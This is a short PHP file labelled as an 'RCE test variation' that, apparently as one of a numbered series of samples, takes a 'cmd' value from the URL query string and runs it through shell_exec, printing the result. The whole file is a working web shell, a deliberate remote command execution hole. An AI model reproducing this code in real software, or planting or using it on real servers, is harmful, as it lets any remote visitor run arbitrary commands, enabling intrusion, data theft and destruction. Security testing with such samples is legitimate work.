<?php
// RCE test variation #1367
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>